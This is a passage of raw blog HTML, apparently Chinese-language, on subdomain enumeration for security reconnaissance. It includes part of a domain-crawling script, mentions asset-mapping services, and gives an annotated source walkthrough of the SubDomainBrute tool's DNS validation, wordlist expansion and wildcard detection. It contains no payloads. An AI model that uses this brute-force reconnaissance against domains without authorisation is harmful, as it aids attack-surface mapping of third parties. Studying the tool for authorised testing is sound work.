links = fetch_links(driver, domain, page)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Traverse links, extract and save unique domain names</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> link <span class=\"keyword\">in</span> links:</span><br><span class=\"line\">            domain_name = extract_domain(link)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> domain_name <span class=\"keyword\">and</span> domain_name <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> unique_links:</span><br><span class=\"line\">                unique_links.add(domain_name)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(domain_name)</span><br><span class=\"line\">                write_file(<span class=\"string\">\"domain.txt\"</span>, domain_name)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># close driver</span></span><br><span class=\"line\">    driver.quit()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>资产测绘工具搜集</strong></p>\n<p>使用资产测绘工具收集，如<strong>fofa、hunter、360quake、微步</strong>等，包括使用站长之家等等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png\" alt=\"img\"></p>\n<p><strong>使用自动化工具</strong></p>\n<p>这里对两种开源的工具进行源码分析，了解其原理</p>\n<h4 id=\"SubDomainBrute源码分析\"><a href=\"#SubDomainBrute源码分析\" class=\"headerlink\" title=\"SubDomainBrute源码分析\"></a><strong>SubDomainBrute源码分析</strong></h4><p>这里只分析主要代码</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 加载DNS服务器地址</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">load_dns_servers</span>():</span><br><span class=\"line\">    print_msg(<span class=\"string\">'[+] Validate DNS servers'</span>, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    dns_servers = []</span><br><span class=\"line\"></span><br><span class=\"line\">    servers_to_test = []</span><br><span class=\"line\">    <span class=\"comment\"># 从字典中加载未被注释的DNS服务器地址</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> server <span class=\"keyword\">in</span> <span class=\"built_in\">open</span>(os.path.join(root_path, <span class=\"string\">'dict/dns_servers.txt'</span>)).readlines():</span><br><span class=\"line\">        server = server.strip()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> server <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> server.startswith(<span class=\"string\">'#'</span>):</span><br><span class=\"line\">            servers_to_test.append(server)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址</span></span><br><span class=\"line\">    loop = asyncio.get_event_loop()</span><br><span class=\"line\">    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 打印有效DNS服务器地址</span></span><br><span class=\"line\">    server_count = <span class=\"built_in\">len</span>(dns_servers)</span><br><span class=\"line\">    print_msg(<span class=\"string\">'\\n[+] %s DNS Servers found'</span> % server_count, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> server_count == <span class=\"number\">0</span>:</span><br><span class=\"line\">        print_msg(<span class=\"string\">'[ERROR] No valid DNS Server !'</span>, line_feed=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        sys.exit(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dns_servers</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载子域名爆破字典</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">load_next_sub</span>(<span class=\"params\">full_scan</span>):</span><br><span class=\"line\">    next_subs = []</span><br><span class=\"line\">    <span class=\"comment\"># 根据full_scan参数判断加载哪个字典</span></span><br><span class=\"line\">    _file = <span class=\"string\">'dict/next_sub_full.txt'</span> <span class=\"keyword\">if</span> full_scan <span class=\"keyword\">else</span> <span class=\"string\">'dict/next_sub.txt'</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 将子域名去重后存入临时集合tmp_set</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(os.path.join(root_path, _file)) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">            sub = line.strip()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> sub <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> next_subs:</span><br><span class=\"line\">                tmp_set = {sub}</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 如果子域名模块包含占位符，如{alphnum}，则进行替换操作</span></span><br><span class=\"line\">                <span class=\"keyword\">while</span> tmp_set:</span><br><span class=\"line\">                    item = tmp_set.pop()</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> item.find(<span class=\"string\">'{alphnum}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">'{alphnum}'</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item.find(<span class=\"string\">'{alpha}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">'abcdefghijklmnopqrstuvwxyz'</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">'{alpha}'</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item.find(<span class=\"string\">'{num}'</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> _letter <span class=\"keyword\">in</span> <span class=\"string\">'0123456789'</span>:</span><br><span class=\"line\">                            tmp_set.add(item.replace(<span class=\"string\">'{num}'</span>, _letter, <span class=\"number\">1</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">elif</span> item <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> next_subs:</span><br><span class=\"line\">                        next_subs.append(item)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> next_subs</span><br></pre></td></tr></tbody></table></figure>\n\n<p>加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。</p>\n<p>在子域名中还存在一个<strong>泛解析</strong>的问题，这个工具里面解决了这个问题</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">async_wildcard_test</span>(<span class=\"params\">domain, dns_servers, level=<span class=\"number\">1</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 创建异步DNS解析器</span></span><br><span class=\"line\">        r = dns.asyncresolver.Resolver()</span><br><span class=\"line\">        <span class=\"comment\"># 使用DNS服务器解析域名</span></span><br><span class=\"line\">        r.nameservers = dns_servers</span><br><span class=\"line\">        <span class=\"comment\"># 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在</span></span><br><span class=\"line\">        answers = <span class=\"keyword\">await</span> r.resolve(<span class=\"string\">'lijiejie-not-existed-test.%s'</span> % domain, <span class=\"string\">'A'</span>, lifetime=<span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析</span></span><br><span class=\"line\">        ips = <span class=\"string\">', '</span>.join(<span class=\"built_in\">sorted</span>([answer.address <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers]))</span><br><span class=\"line\">        <span class=\"comment\"># 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> level == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">'any-sub.%s\\t%s'</span> % (domain.ljust(<span class=\"number\">30</span>), ips))</span><br><span class=\"line\">            <span class=\"keyword\">await</span> async_wildcard_test(<span class=\"string\">'any-sub.%s'</span> % domain, dns_servers, <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 打印提示信息，使用-w参数强制扫描通配符域名</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> level == <span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">'\\nUse -w to enable force scan wildcard domain'</span>)</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> domain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">wildcard_test</span>(<span class=\"params\">domain, dns_servers</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 获取当前的异步事件循环</span></span><br><span class=\"line\">    loop = asyncio.get_event_loop()</span><br><span class=\"line\">    <span class=\"comment\"># 等待异步任务完成</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> loop.run_until_complete(</span><br><span class=\"line\">        <span class=\"comment\"># 并行执行多个异步任务，并返回它们的结果</span></span><br><span class=\"line\">        asyncio.gather(</span><br><span class=\"line\">            async_wildcard_test(domain, dns_servers, level=<span class=\"number\">1</span>)</span><br><span class=\"line\">        )</span><br><span class=\"line\">    )[<span class=\"number\">0</span>]</span><br></pre></td></tr></tbody></table></figure>\n\n<p>通过给出一个不存在的域名检测，判断是否开启了泛解析</p>\n<p>接下来看看扫描模块</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 爆破模块</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SubNameBrute</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 初始化</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, *params</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 提取传入参数</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.domain, <span class=\"variable language_\">self</span>.options, <span class=\"variable language_\">self</span>.process_num, <span class=\"variable language_\">self</span>.dns_servers, <span class=\"variable language_\">self</span>.next_subs, \\</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count, <span class=\"variable language_\">self</span>.found_count, <span class=\"variable language_\">self</span>.queue_size_array, tmp_dir = params</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.dns_count = <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.dns_servers)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.scan_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.found_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># 初始化DNS解析器</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.resolvers = [dns.asyncresolver.Resolver(configure=<span class=\"literal\">False</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"variable language_\">self</span>.options.threads)]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> r <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.resolvers:</span><br><span class=\"line\">            <span class=\"comment\"># 解析事件</span></span><br><span class=\"line\">            r.lifetime = <span class=\"number\">6.0</span></span><br><span class=\"line\">            <span class=\"comment\"># 超时时间</span></span><br><span class=\"line\">            r.timeout = <span class=\"number\">10.0</span></span><br><span class=\"line\">        <span class=\"comment\"># 优先队列和状态变量</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.queue = PriorityQueue()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.ip_dict = {}</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.found_subs = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.cert_subs = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.timeout_subs = {}</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.no_server_subs = {}</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.count_time = time.time()</span><br><span class=\"line\">        <span class=\"comment\"># 输出日志到文件</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.outfile = <span class=\"built_in\">open</span>(<span class=\"string\">'%s/%s_part_%s.txt'</span> % (tmp_dir, <span class=\"variable language_\">self</span>.domain, <span class=\"variable language_\">self</span>.process_num), <span class=\"string\">'w'</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.normal_names_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.lock = asyncio.Lock()</span><br><span class=\"line\">        <span class=\"comment\"># 线程状态</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.threads_status = [<span class=\"string\">'1'</span>] * <span class=\"variable language_\">self</span>.options.threads</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 加载子域名字典</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">load_sub_names</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        normal_lines = []</span><br><span class=\"line\">        wildcard_lines = []</span><br><span class=\"line\">        wildcard_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        regex_list = []</span><br><span class=\"line\">        lines = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"comment\"># 打开文件逐行读取子域名，跳过空行或重复子域名</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"variable language_\">self</span>.options.file) <span class=\"keyword\">as</span> inFile:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> inFile.readlines():</span><br><span class=\"line\">                sub = line.strip()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> sub <span class=\"keyword\">or</span> sub <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                lines.add(sub)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 判断子域名是否含占位符</span></span><br><span class=\"line\">                brace_count = sub.count(<span class=\"string\">'{'</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> brace_count &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                    wildcard_lines.append((brace_count, sub))</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># 占位符处理</span></span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">'{alphnum}'</span>, <span class=\"string\">'[a-z0-9]'</span>)</span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">'{alpha}'</span>, <span class=\"string\">'[a-z]'</span>)</span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">'{num}'</span>, <span class=\"string\">'[0-9]'</span>)</span><br><span class=\"line\">                    <span class=\"comment\"># 去重</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> wildcard_set:</span><br><span class=\"line\">                        wildcard_set.add(sub)</span><br><span class=\"line\">                        regex_list.append(<span class=\"string\">'^'</span> + sub + <span class=\"string\">'$'</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"comment\"># 普通子域名直接加入列表</span></span><br><span class=\"line\">                    normal_lines.append(sub)</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.normal_names_set.add(sub)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> regex_list:</span><br><span class=\"line\">            pattern = <span class=\"string\">'|'</span>.join(regex_list)</span><br><span class=\"line\">            _regex = re.<span class=\"built_in\">compile</span>(pattern)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> normal_lines:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> _regex.search(line):</span><br><span class=\"line\">                    normal_lines.remove(line)</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        <span class=\"comment\"># 普通子域名加入队列，优先级为0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> normal_lines[<span class=\"variable language_\">self</span>.process_num::<span class=\"variable language_\">self</span>.options.process]:</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, _))    <span class=\"comment\"># priority set to 0</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 含占位符的子域名直接加入队列</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> wildcard_lines[<span class=\"variable language_\">self</span>.process_num::<span class=\"variable language_\">self</span>.options.process]:</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put(_)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检测进程状态</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">update_counter</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'1'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.threads_status:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count.value += <span class=\"variable language_\">self</span>.scan_count_local</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.queue_size_array[<span class=\"variable language_\">self</span>.process_num] = <span class=\"variable language_\">self</span>.queue.qsize()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.found_count_local:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.found_count.value += <span class=\"variable language_\">self</span>.found_count_local</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.found_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.count_time = time.time()</span><br><span class=\"line\">            <span class=\"keyword\">await</span> asyncio.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span 